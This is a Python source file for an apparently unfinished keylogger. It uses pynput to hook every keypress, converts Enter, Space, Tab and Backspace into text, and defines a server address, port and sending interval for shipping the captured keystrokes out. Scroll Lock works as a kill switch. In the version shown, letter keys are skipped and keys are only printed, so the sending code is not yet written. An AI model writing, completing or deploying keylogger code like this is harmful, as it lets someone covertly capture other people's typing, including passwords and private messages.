from pynput import keyboard
from pynput.keyboard import Key, KeyCode

server_ip = '127.0.0.1'
server_port = 9998
kill_switch = True
sending_interval = 1
data = ''

def process_keypress(key : Key | KeyCode):
    global data
    
    if key == None:
        return
    
    # Controler key pressed
    txt = ''
    if isinstance(key, Key):
        match key:
            case Key.enter:
                txt = '\n'
            case Key.space:
                txt = ' '
            case Key.tab:
                txt = '\t'
            case Key.backspace:
                txt = '[BKSP]'
            case Key.scroll_lock: # kill switch
                if kill_switch:
                    return False
    elif isinstance(key, KeyCode): # Letter pressed
        pass
    else:
        return
        
    
    print(key, type(key))
    
    
with keyboard.Listener(on_press=process_keypress) as listener:
    listener.join()